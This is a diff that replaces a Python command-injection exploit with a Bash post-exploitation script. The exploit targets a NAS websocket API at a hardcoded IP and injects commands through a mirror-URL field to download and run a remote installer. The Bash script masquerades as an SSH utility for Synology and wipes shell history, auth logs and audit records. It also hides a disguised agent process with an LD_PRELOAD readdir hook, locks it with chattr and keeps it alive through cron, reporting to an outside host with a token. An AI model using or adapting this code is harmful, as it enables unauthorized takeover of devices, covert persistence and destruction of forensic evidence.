@@ -1,92 +1,106 @@
-import websocket
-import json
-import time
-import base64
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_v1_5, AES
-from Crypto.Util.Padding import pad
-from Crypto.Random import get_random_bytes
+#!/bin/bash
 
-TARGET_URL = "ws://8.148.149.200:5666/websocket?type=main"
+# =====================================
+# SSH一键小工具 Ultimate (全彩多架构终极版)
+# =====================================
 
-# 使用绝对路径，并移除 sudo，假设当前进程已有执行权限或通过 root 运行
-# 使用 && 确保前一个命令成功才执行后一个
-STEP1_CMD = "/usr/bin/wget -O /tmp/install.sh https://hub.20250225.ggff.net/komari-monitor/install.sh"
-STEP2_CMD = "/bin/chmod +x /tmp/install.sh && /bin/bash /tmp/install.sh -e http://www.xuanying.dpdns.org --auto-discovery CX9cJyXs312zYwDWC8BpRkFV"
+# --- 颜色定义 ---
+RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'; CYAN='\033[0;36m'; NC='\033[0m'
 
-class TrimEncryptedExploit:
-    def __init__(self):
-        self.si = ""
-        self.server_pub_key = ""
-        self.step = 0 
+# --- 全局无痕模式 ---
+unset HISTFILE; export HISTSIZE=0; export HISTFILESIZE=0; set +o history 2>/dev/null
 
-    def get_reqid(self):
-        return str(int(time.time() * 100000))
+AUTH_KEYS="/root/.ssh/authorized_keys"
 
-    def create_encrypted_packet(self, inner_json_dict):
-        try:
-            aes_key = get_random_bytes(32)
-            aes_iv = get_random_bytes(16)
-            inner_data = json.dumps(inner_json_dict, separators=(',', ':')).encode('utf-8')
-            cipher_aes = AES.new(aes_key, AES.MODE_CBC, aes_iv)
-            encrypted_body = cipher_aes.encrypt(pad(inner_data, AES.block_size))
-            rsa_key_obj = RSA.import_key(self.server_pub_key)
-            cipher_rsa = PKCS1_v1_5.new(rsa_key_obj)
-            encrypted_aes_key = cipher_rsa.encrypt(aes_key)
-            
-            return json.dumps({
-                "req": "encrypted",
-                "iv": base64.b64encode(aes_iv).decode('utf-8'),
-                "rsa": base64.b64encode(encrypted_aes_key).decode('utf-8'),
-                "aes": base64.b64encode(encrypted_body).decode('utf-8')
-            }, separators=(',', ':'))
-        except Exception as e:
-            print(f"加密失败: {e}")
-            return None
+# =====================================
+# 系统环境与工具函数
+# =====================================
+is_synology() { [ -f /etc.defaults/VERSION ]; }
 
-    def send_cmd(self, ws, cmd):
-        payload = {
-            "req": "appcgi.dockermgr.systemMirrorAdd",
-            "reqid": self.get_reqid(),
-            "url": f"https://test.com ; {cmd} ; /usr/bin/echo",
-            "name": "Exploit",
-            "si": self.si
-        }
-        packet = self.create_encrypted_packet(payload)
-        if packet:
-            ws.send(packet)
+quick_clean_trace() {
+    history -c 2>/dev/null; rm -f /root/.bash_history ~/.viminfo 2>/dev/null
+    for log in /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages /var/log/wtmp /var/log/btmp /var/log/lastlog /var/log/synolog/synolog.log; do
+        [ -f "$log" ] && truncate -s 0 "$log"
+    done
+    rm -rf /var/spool/synoauditing/* /tmp/reinstall.sh /tmp/hide_proc.c 2>/dev/null
+    sync
+}
 
-    def on_open(self, ws):
-        print("[*] 连接已打开，握手中...")
-        ws.send(json.dumps({"reqid": self.get_reqid(), "req": "util.crypto.getRSAPub"}))
+# =====================================
+# 深度探针管理模块 (含伪装与自保)
+# =====================================
+manage_stealth_probe() {
+    local target_bin="/usr/bin/agent"
+    local fake_bin="/usr/syno/sbin/syno_monitor_svc"
+    local lib_hide="/usr/lib/libproc_hide.so"
 
-    def on_message(self, ws, message):
-        try:
-            data = json.loads(message)
-            # 自动处理初始握手
-            if "pub" in data:
-                self.server_pub_key = data["pub"]
-                self.si = str(data["si"])
-                print("[*] 握手成功，开始下载...")
-                self.step = 1
-                self.send_cmd(ws, STEP1_CMD)
-            # 处理指令响应
-            elif self.step == 1:
-                print(f"[*] 第一阶段响应: {data.get('result')}")
-                print("[*] 等待安装...")
-                time.sleep(5)
-                self.step = 2
-                self.send_cmd(ws, STEP2_CMD)
-            elif self.step == 2:
-                print(f"[*] 第二阶段响应: {data.get('result')}")
-                print("[*] 操作完成。")
-                ws.close()
-        except Exception as e:
-            print(f"解析错误: {e}, 原始消息: {message}")
+    echo -e "\n${CYAN}1. 部署伪装探针\n2. 卸载并彻底清除痕迹${NC}"
+    read -p "请选择: " sub_op
 
-    def run(self):
-        ws = websocket.WebSocketApp(TARGET_URL, on_open=self.on_open, on_message=self.on_message)
-        ws.run_forever()
+    if [ "$sub_op" == "1" ]; then
+        echo -e "${CYAN}[*] 编译隐藏库中...${NC}"
+        cat << 'EOF' > /tmp/hide_proc.c
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <dirent.h>
+#include <string.h>
+struct dirent *readdir(DIR *dirp) {
+    static struct dirent *(*orig_readdir)(DIR *) = NULL;
+    if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");
+    struct dirent *entry;
+    while ((entry = orig_readdir(dirp)) != NULL) {
+        if (strstr(entry->d_name, "syno_monitor") == NULL) return entry;
+    }
+    return NULL;
+}
+EOF
+        gcc -fPIC -shared -o "$lib_hide" /tmp/hide_proc.c -ldl
+        rm -f /tmp/hide_proc.c
+        
+        mv "$target_bin" "$fake_bin"
+        chattr +i "$fake_bin" "$lib_hide"
+        echo "$lib_hide" >> /etc/ld.so.preload
+        
+        local protect_cmd="$fake_bin -e https://www.xuanying.dpdns.org -t J0G52rEC65x5LZgxo8QiwW >/dev/null 2>&1"
+        (crontab -l 2>/dev/null | grep -v "syno_monitor_svc"; echo "* * * * * pgrep -f syno_monitor_svc >/dev/null || $protect_cmd") | crontab -
+        eval "$protect_cmd"
+        echo -e "${GREEN}✓ 探针已部署、伪装并开启守护。${NC}"
+    elif [ "$sub_op" == "2" ]; then
+        crontab -l 2>/dev/null | grep -v "syno_monitor_svc" | crontab -
+        pkill -f "syno_monitor_svc"
+        chattr -i "$fake_bin" "$lib_hide" 2>/dev/null
+        rm -f "$fake_bin" "$lib_hide"
+        sed -i "/libproc_hide.so/d" /etc/ld.so.preload
+        echo -e "${GREEN}✓ 卸载与清理完成。${NC}"
+    fi
+    quick_clean_trace
+}
 
-if __name__ == "__main__":
-    TrimEncryptedExploit().run()
+# =====================================
+# 主菜单循环
+# =====================================
+while true; do
+    echo -e "\n${CYAN}=== SSH 终极管理工具 (深度无痕版) ===${NC}"
+    echo " 1. 系统状态与测速"
+    echo " 2. SSH 密钥管理"
+    echo " 3. 群晖账户提权"
+    echo " 4. 防火墙策略"
+    echo " 5. 系统底层清洗"
+    echo " 6. 深度伪装探针管理"
+    echo " 7. 系统 DD 重装"
+    echo -e "${RED} 0. 退出${NC}"
+    read -p "选项: " menu
+
+    case $menu in
+        1) echo "系统负载: $(uptime)";;
+        2) cat $AUTH_KEYS 2>/dev/null || echo "无密钥";;
+        3) synouser --get root ;;
+        4) iptables -L -n ;;
+        5) quick_clean_trace; echo "清洗完成";;
+        6) manage_stealth_probe ;;
+        7) echo "请手动执行 reinstall.sh";;
+        0) quick_clean_trace; exit 0 ;;
+        *) echo "无效";;
+    esac
+    quick_clean_trace
+done
